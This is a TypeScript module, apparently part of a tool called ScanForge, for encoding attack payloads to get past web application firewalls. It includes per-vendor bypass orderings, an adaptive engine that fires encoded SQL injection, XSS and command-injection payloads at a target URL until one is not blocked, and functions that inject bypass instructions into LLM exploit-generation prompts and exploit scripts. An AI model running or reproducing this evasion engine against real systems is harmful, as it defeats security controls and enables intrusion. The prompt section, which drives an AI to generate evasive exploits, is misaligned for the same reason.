/**
 * Payload Encoding & WAF Evasion Engine (Gap 2)
 * ═══════════════════════════════════════════════
 * Multi-layer payload encoding and adaptive WAF bypass system.
 * Raw payloads are wrapped in encoding strategies before delivery.
 *
 * Encoding strategies (per OWASP WAF bypass methodology):
 *   1. URL encoding (single, double, triple)
 *   2. Unicode normalization (UTF-8, UTF-16, UTF-32)
 *   3. HTML entity encoding (decimal, hex, named)
 *   4. Null byte injection
 *   5. Case alternation (mixed case keywords)
 *   6. Comment insertion (SQL/JS comment splitting)
 *   7. Chunked transfer encoding
 *   8. HTTP parameter pollution
 *   9. Whitespace substitution
 *  10. Hex encoding
 *  11. Base64 encoding
 *  12. Concatenation splitting
 *
 * Adaptive retry: if first attempt returns 403/406, automatically
 * re-encode with alternative technique and retry.
 */

import { detectWaf, type WafDetectionResult } from './waf-detector';

// ═══════════════════════════════════════════════════════════════════════
// §1 — TYPES
// ═══════════════════════════════════════════════════════════════════════

export type EncodingTechnique =
  | 'url_single'
  | 'url_double'
  | 'url_triple'
  | 'unicode_utf8'
  | 'unicode_utf16'
  | 'html_decimal'
  | 'html_hex'
  | 'null_byte'
  | 'case_alternation'
  | 'comment_insertion_sql'
  | 'comment_insertion_js'
  | 'whitespace_substitution'
  | 'hex_encoding'
  | 'base64_inline'
  | 'concat_splitting'
  | 'char_function'
  | 'http_param_pollution'
  | 'none';

export type VulnClass = 'sqli' | 'xss' | 'cmdi' | 'ssrf' | 'ssti' | 'lfi' | 'xxe' | 'generic';

export interface EncodedPayload {
  /** Original raw payload */
  original: string;
  /** Encoded payload */
  encoded: string;
  /** Encoding technique used */
  technique: EncodingTechnique;
  /** Vulnerability class */
  vulnClass: VulnClass;
  /** Description of encoding applied */
  description: string;
  /** Encoding depth (1 = single, 2 = double, etc.) */
  depth: number;
}

export interface AdaptiveRetryResult {
  /** Whether bypass was achieved */
  bypassed: boolean;
  /** Number of attempts made */
  attempts: number;
  /** Successful encoding technique (if bypassed) */
  successfulTechnique?: EncodingTechnique;
  /** All attempts with results */
  attemptLog: AttemptLogEntry[];
  /** WAF detection result */
  wafDetection?: WafDetectionResult;
  /** Final encoded payload that worked */
  finalPayload?: string;
}

export interface AttemptLogEntry {
  attempt: number;
  technique: EncodingTechnique;
  payload: string;
  httpStatus?: number;
  blocked: boolean;
  responseSnippet?: string;
  latencyMs: number;
}

export interface PayloadEncodingConfig {
  /** Max encoding attempts before giving up */
  maxAttempts: number;
  /** Detect WAF before encoding */
  detectWafFirst: boolean;
  /** Delay between retry attempts in ms */
  retryDelayMs: number;
  /** Request timeout in ms */
  requestTimeoutMs: number;
  /** Vulnerability class for context-aware encoding */
  vulnClass: VulnClass;
}

const DEFAULT_CONFIG: PayloadEncodingConfig = {
  maxAttempts: 6,
  detectWafFirst: true,
  retryDelayMs: 1000,
  requestTimeoutMs: 10000,
  vulnClass: 'generic',
};

// ═══════════════════════════════════════════════════════════════════════
// §2 — ENCODING FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════

/** URL encode a string (single pass) */
function urlEncode(s: string): string {
  return encodeURIComponent(s);
}

/** Double URL encode */
function urlDoubleEncode(s: string): string {
  return encodeURIComponent(encodeURIComponent(s));
}

/** Triple URL encode */
function urlTripleEncode(s: string): string {
  return encodeURIComponent(encodeURIComponent(encodeURIComponent(s)));
}

/** Unicode UTF-8 overlong encoding */
function unicodeUtf8Encode(s: string): string {
  return s.split('').map(c => {
    const code = c.charCodeAt(0);
    if (code < 128 && /[a-zA-Z<>'"/\\]/.test(c)) {
      // Overlong 2-byte UTF-8 encoding
      return `%c0%${(code + 0x80).toString(16)}`;
    }
    return c;
  }).join('');
}

/** Unicode UTF-16 encoding */
function unicodeUtf16Encode(s: string): string {
  return s.split('').map(c => {
    const code = c.charCodeAt(0);
    if (/[a-zA-Z<>'"/\\]/.test(c)) {
      return `%u00${code.toString(16).padStart(2, '0')}`;
    }
    return c;
  }).join('');
}

/** HTML decimal entity encoding */
function htmlDecimalEncode(s: string): string {
  return s.split('').map(c => {
    if (/[a-zA-Z<>'"/\\=()]/.test(c)) {
      return `&#${c.charCodeAt(0)};`;
    }
    return c;
  }).join('');
}

/** HTML hex entity encoding */
function htmlHexEncode(s: string): string {
  return s.split('').map(c => {
    if (/[a-zA-Z<>'"/\\=()]/.test(c)) {
      return `&#x${c.charCodeAt(0).toString(16)};`;
    }
    return c;
  }).join('');
}

/** Null byte injection — insert %00 before sensitive characters */
function nullByteInject(s: string): string {
  return s.replace(/([<>'"/\\])/g, '%00$1');
}

/** Case alternation for SQL/HTML keywords */
function caseAlternate(s: string): string {
  const keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'INSERT', 'UPDATE', 'DELETE', 'DROP',
    'SCRIPT', 'ALERT', 'ONERROR', 'ONLOAD', 'IMG', 'SRC', 'EVAL', 'EXEC', 'SLEEP', 'BENCHMARK',
    'CONCAT', 'GROUP_CONCAT', 'INFORMATION_SCHEMA', 'TABLE_NAME', 'COLUMN_NAME'];

  let result = s;
  for (const kw of keywords) {
    const regex = new RegExp(`\\b${kw}\\b`, 'gi');
    result = result.replace(regex, (match) => {
      return match.split('').map((c, i) => i % 2 === 0 ? c.toLowerCase() : c.toUpperCase()).join('');
    });
  }
  return result;
}

/** SQL comment insertion — split keywords with inline comments */
function commentInsertionSql(s: string): string {
  const keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'INSERT', 'UPDATE', 'DELETE',
    'SLEEP', 'BENCHMARK', 'CONCAT', 'GROUP_CONCAT'];

  let result = s;
  for (const kw of keywords) {
    const regex = new RegExp(`\\b${kw}\\b`, 'gi');
    result = result.replace(regex, (match) => {
      const mid = Math.floor(match.length / 2);
      return `${match.slice(0, mid)}/**/` + match.slice(mid);
    });
  }
  return result;
}

/** JavaScript comment insertion */
function commentInsertionJs(s: string): string {
  return s
    .replace(/javascript:/gi, 'java\x09script:')
    .replace(/alert/gi, 'al\x09ert')
    .replace(/eval/gi, 'ev\x09al')
    .replace(/document/gi, 'docu\x09ment');
}

/** Whitespace substitution — replace spaces with alternatives */
function whitespaceSubstitute(s: string): string {
  const alternatives = ['\t', '\n', '\r', '\x0b', '\x0c', '/**/'];
  let idx = 0;
  return s.replace(/ /g, () => {
    const alt = alternatives[idx % alternatives.length];
    idx++;
    return alt;
  });
}

/** Hex encoding for SQL */
function hexEncode(s: string): string {
  return '0x' + Buffer.from(s).toString('hex');
}

/** CHAR() function encoding for SQL */
function charFunctionEncode(s: string): string {
  const chars = s.split('').map(c => c.charCodeAt(0));
  return `CHAR(${chars.join(',')})`;
}

/** Concatenation splitting for SQL strings */
function concatSplit(s: string): string {
  if (s.length < 4) return s;
  const mid = Math.floor(s.length / 2);
  return `CONCAT('${s.slice(0, mid)}','${s.slice(mid)}')`;
}

// ═══════════════════════════════════════════════════════════════════════
// §3 — ENCODING REGISTRY
// ═══════════════════════════════════════════════════════════════════════

const ENCODERS: Record<EncodingTechnique, (s: string) => string> = {
  url_single: urlEncode,
  url_double: urlDoubleEncode,
  url_triple: urlTripleEncode,
  unicode_utf8: unicodeUtf8Encode,
  unicode_utf16: unicodeUtf16Encode,
  html_decimal: htmlDecimalEncode,
  html_hex: htmlHexEncode,
  null_byte: nullByteInject,
  case_alternation: caseAlternate,
  comment_insertion_sql: commentInsertionSql,
  comment_insertion_js: commentInsertionJs,
  whitespace_substitution: whitespaceSubstitute,
  hex_encoding: hexEncode,
  base64_inline: (s) => Buffer.from(s).toString('base64'),
  concat_splitting: concatSplit,
  char_function: charFunctionEncode,
  http_param_pollution: (s) => s, // HPP is applied at the request level, not payload level
  none: (s) => s,
};

// ═══════════════════════════════════════════════════════════════════════
// §4 — WAF-SPECIFIC BYPASS STRATEGIES
// ═══════════════════════════════════════════════════════════════════════

/** Ordered encoding strategies per WAF vendor */
const WAF_BYPASS_STRATEGIES: Record<string, EncodingTechnique[]> = {
  Cloudflare: [
    'case_alternation',
    'comment_insertion_sql',
    'unicode_utf8',
    'url_double',
    'whitespace_substitution',
    'hex_encoding',
  ],
  'AWS WAF': [
    'url_double',
    'unicode_utf16',
    'comment_insertion_sql',
    'case_alternation',
    'null_byte',
    'whitespace_substitution',
  ],
  Akamai: [
    'unicode_utf8',
    'url_triple',
    'comment_insertion_sql',
    'whitespace_substitution',
    'case_alternation',
    'hex_encoding',
  ],
  'Imperva/Incapsula': [
    'url_double',
    'unicode_utf8',
    'comment_insertion_sql',
    'case_alternation',
    'null_byte',
    'concat_splitting',
  ],
  'F5 BIG-IP ASM': [
    'http_param_pollution',
    'unicode_utf8',
    'comment_insertion_sql',
    'url_double',
    'case_alternation',
    'whitespace_substitution',
  ],
  ModSecurity: [
    'unicode_utf8',
    'comment_insertion_sql',
    'case_alternation',
    'url_double',
    'whitespace_substitution',
    'null_byte',
  ],
  Sucuri: [
    'url_double',
    'case_alternation',
    'comment_insertion_sql',
    'unicode_utf8',
    'whitespace_substitution',
    'hex_encoding',
  ],
  'Fortinet FortiWeb': [
    'comment_insertion_sql',
    'case_alternation',
    'url_double',
    'unicode_utf8',
    'whitespace_substitution',
    'null_byte',
  ],
  // Generic/unknown WAF
  'Unknown WAF': [
    'url_double',
    'case_alternation',
    'comment_insertion_sql',
    'unicode_utf8',
    'whitespace_substitution',
    'url_triple',
  ],
};

/** Vuln-class-specific encoding preferences */
const VULN_CLASS_ENCODINGS: Record<VulnClass, EncodingTechnique[]> = {
  sqli: ['comment_insertion_sql', 'case_alternation', 'whitespace_substitution', 'hex_encoding', 'char_function', 'concat_splitting'],
  xss: ['html_decimal', 'html_hex', 'unicode_utf8', 'url_double', 'comment_insertion_js', 'case_alternation'],
  cmdi: ['url_double', 'null_byte', 'whitespace_substitution', 'hex_encoding', 'unicode_utf8', 'case_alternation'],
  ssrf: ['url_double', 'url_triple', 'unicode_utf8', 'null_byte', 'case_alternation', 'hex_encoding'],
  ssti: ['url_double', 'unicode_utf8', 'html_hex', 'url_triple', 'case_alternation', 'whitespace_substitution'],
  lfi: ['url_double', 'url_triple', 'null_byte', 'unicode_utf8', 'whitespace_substitution', 'hex_encoding'],
  xxe: ['html_decimal', 'html_hex', 'unicode_utf8', 'url_double', 'case_alternation', 'whitespace_substitution'],
  generic: ['url_double', 'case_alternation', 'unicode_utf8', 'comment_insertion_sql', 'whitespace_substitution', 'hex_encoding'],
};

// ═══════════════════════════════════════════════════════════════════════
// §5 — CORE ENCODING API
// ═══════════════════════════════════════════════════════════════════════

/**
 * Encode a payload using a specific technique.
 */
export function encodePayload(
  payload: string,
  technique: EncodingTechnique,
  vulnClass: VulnClass = 'generic',
): EncodedPayload {
  const encoder = ENCODERS[technique];
  if (!encoder) {
    return {
      original: payload,
      encoded: payload,
      technique: 'none',
      vulnClass,
      description: `Unknown encoding technique: ${technique}`,
      depth: 0,
    };
  }

  return {
    original: payload,
    encoded: encoder(payload),
    technique,
    vulnClass,
    description: `Encoded with ${technique}`,
    depth: 1,
  };
}

/**
 * Generate all encoding variants for a payload.
 * Returns an ordered list based on WAF vendor and vuln class.
 */
export function generateEncodingVariants(
  payload: string,
  vulnClass: VulnClass = 'generic',
  wafVendor?: string,
): EncodedPayload[] {
  // Determine encoding order
  let techniques: EncodingTechnique[];

  if (wafVendor && WAF_BYPASS_STRATEGIES[wafVendor]) {
    techniques = WAF_BYPASS_STRATEGIES[wafVendor];
  } else {
    techniques = VULN_CLASS_ENCODINGS[vulnClass] || VULN_CLASS_ENCODINGS.generic;
  }

  // Generate variants
  const variants: EncodedPayload[] = [
    // Always include the raw payload first
    {
      original: payload,
      encoded: payload,
      technique: 'none',
      vulnClass,
      description: 'Raw payload (no encoding)',
      depth: 0,
    },
  ];

  for (const technique of techniques) {
    variants.push(encodePayload(payload, technique, vulnClass));
  }

  // Add multi-layer encodings (e.g., case_alternation + url_double)
  if (techniques.length >= 2) {
    const combo1 = ENCODERS[techniques[0]];
    const combo2 = ENCODERS[techniques[1]];
    if (combo1 && combo2) {
      variants.push({
        original: payload,
        encoded: combo2(combo1(payload)),
        technique: techniques[1],
        vulnClass,
        description: `Multi-layer: ${techniques[0]} → ${techniques[1]}`,
        depth: 2,
      });
    }
  }

  return variants;
}

// ═══════════════════════════════════════════════════════════════════════
// §6 — ADAPTIVE RETRY ENGINE
// ═══════════════════════════════════════════════════════════════════════

/**
 * Send a payload with adaptive WAF evasion.
 * If blocked, automatically re-encodes and retries with alternative techniques.
 */
export async function sendWithAdaptiveEvasion(
  targetUrl: string,
  payload: string,
  paramName: string,
  config: Partial<PayloadEncodingConfig> = {},
): Promise<AdaptiveRetryResult> {
  const cfg = { ...DEFAULT_CONFIG, ...config };
  const attemptLog: AttemptLogEntry[] = [];
  let wafDetection: WafDetectionResult | undefined;

  // Step 1: Detect WAF if enabled
  if (cfg.detectWafFirst) {
    try {
      wafDetection = await detectWaf(targetUrl);
      if (wafDetection.detected) {
        console.log(`[PayloadEncoder] WAF detected: ${wafDetection.vendor} (${wafDetection.confidence} confidence)`);
      }
    } catch (err: any) {
      console.warn(`[PayloadEncoder] WAF detection failed: ${err.message}`);
    }
  }

  // Step 2: Generate encoding variants
  const variants = generateEncodingVariants(
    payload,
    cfg.vulnClass,
    wafDetection?.vendor,
  );

  // Step 3: Try each variant
  for (let i = 0; i < Math.min(variants.length, cfg.maxAttempts); i++) {
    const variant = variants[i];
    const startTime = Date.now();

    try {
      const url = new URL(targetUrl);
      url.searchParams.set(paramName, variant.encoded);

      const response = await fetch(url.toString(), {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Accept-Language': 'en-US,en;q=0.5',
          'Accept-Encoding': 'gzip, deflate',
        },
        signal: AbortSignal.timeout(cfg.requestTimeoutMs),
      });

      const body = await response.text();
      const latencyMs = Date.now() - startTime;
      const blocked = isBlockedResponse(response.status, body);

      attemptLog.push({
        attempt: i + 1,
        technique: variant.technique,
        payload: variant.encoded.slice(0, 200),
        httpStatus: response.status,
        blocked,
        responseSnippet: body.slice(0, 300),
        latencyMs,
      });

      if (!blocked) {
        return {
          bypassed: true,
          attempts: i + 1,
          successfulTechnique: variant.technique,
          attemptLog,
          wafDetection,
          finalPayload: variant.encoded,
        };
      }

      // Add delay between retries
      if (i < variants.length - 1) {
        await new Promise(r => setTimeout(r, cfg.retryDelayMs));
      }

    } catch (err: any) {
      attemptLog.push({
        attempt: i + 1,
        technique: variant.technique,
        payload: variant.encoded.slice(0, 200),
        blocked: true,
        responseSnippet: err.message,
        latencyMs: Date.now() - startTime,
      });
    }
  }

  return {
    bypassed: false,
    attempts: attemptLog.length,
    attemptLog,
    wafDetection,
  };
}

// ═══════════════════════════════════════════════════════════════════════
// §7 — BLOCK DETECTION
// ═══════════════════════════════════════════════════════════════════════

/** Determine if a response indicates the payload was blocked */
function isBlockedResponse(status: number, body: string): boolean {
  // HTTP status codes that indicate blocking
  if ([403, 406, 429, 503].includes(status)) return true;

  // WAF block page patterns
  const blockPatterns = [
    /access denied/i,
    /request blocked/i,
    /forbidden/i,
    /not acceptable/i,
    /rate limit/i,
    /captcha/i,
    /challenge/i,
    /cloudflare.*ray/i,
    /attention required/i,
    /security.*check/i,
    /please.*verify/i,
    /bot.*detected/i,
    /automated.*request/i,
    /waf.*block/i,
    /mod_security/i,
    /incapsula/i,
  ];

  for (const pattern of blockPatterns) {
    if (pattern.test(body)) return true;
  }

  return false;
}

// ═══════════════════════════════════════════════════════════════════════
// §8 — LLM PROMPT INJECTION FOR WAF CONTEXT
// ═══════════════════════════════════════════════════════════════════════

/**
 * Generate WAF-aware context for LLM exploit generation prompts.
 * This is injected into the LLM prompt so it generates encoded payloads.
 */
export function generateWafContextForLLM(
  wafResult?: WafDetectionResult,
  vulnClass?: VulnClass,
): string {
  if (!wafResult?.detected) {
    return 'No WAF detected. Standard payloads should work.';
  }

  const vendor = wafResult.vendor || 'Unknown';
  const strategies = WAF_BYPASS_STRATEGIES[vendor] || WAF_BYPASS_STRATEGIES['Unknown WAF'];
  const hints = wafResult.evasionHints || [];

  return `
WAF DETECTED: ${vendor} (confidence: ${wafResult.confidence})
Evidence: ${wafResult.evidence.join('; ')}

REQUIRED ENCODING STRATEGIES (in order of effectiveness for ${vendor}):
${strategies.map((s, i) => `${i + 1}. ${s}`).join('\n')}

EVASION HINTS:
${hints.map(h => `- ${h}`).join('\n')}

CRITICAL INSTRUCTIONS:
- DO NOT send raw payloads — they WILL be blocked
- Apply at least one encoding technique from the list above
- For SQL injection: use inline comments (/**/), case alternation, and whitespace substitution
- For XSS: use HTML entity encoding and Unicode normalization
- For command injection: use URL double-encoding and null bytes
- Test with the simplest bypass first, then escalate
- Include a fallback payload using a different encoding if the first fails
${vulnClass ? `\nVulnerability class: ${vulnClass} — use class-specific bypass techniques` : ''}
`;
}

/**
 * Generate a Python code snippet that applies encoding at runtime.
 * This is injected into LLM-generated exploit scripts.
 */
export function generateEncodingSnippet(vulnClass: VulnClass = 'generic'): string {
  return `
# ── ScanForge Payload Encoding Layer ──
import urllib.parse

def sf_encode(payload, technique='url_double'):
    """Apply WAF bypass encoding to a payload."""
    encoders = {
        'url_single': lambda p: urllib.parse.quote(p),
        'url_double': lambda p: urllib.parse.quote(urllib.parse.quote(p)),
        'url_triple': lambda p: urllib.parse.quote(urllib.parse.quote(urllib.parse.quote(p))),
        'case_alt': lambda p: ''.join(c.upper() if i%2 else c.lower() for i,c in enumerate(p)),
        'comment_sql': lambda p: p.replace('SELECT', 'SEL/**/ECT').replace('UNION', 'UN/**/ION').replace('FROM', 'FR/**/OM'),
        'null_byte': lambda p: p.replace("'", "%00'").replace('"', '%00"'),
        'hex': lambda p: '0x' + p.encode().hex(),
        'whitespace': lambda p: p.replace(' ', '/**/'),
    }
    return encoders.get(technique, lambda p: p)(payload)

def sf_encode_chain(payload, techniques):
    """Apply multiple encoding techniques in sequence."""
    result = payload
    for t in techniques:
        result = sf_encode(result, t)
    return result

# Recommended encoding chain for ${vulnClass}:
# payload = sf_encode_chain(raw_payload, ${JSON.stringify(VULN_CLASS_ENCODINGS[vulnClass]?.slice(0, 3) || ['url_double', 'case_alt'])})
`;
}
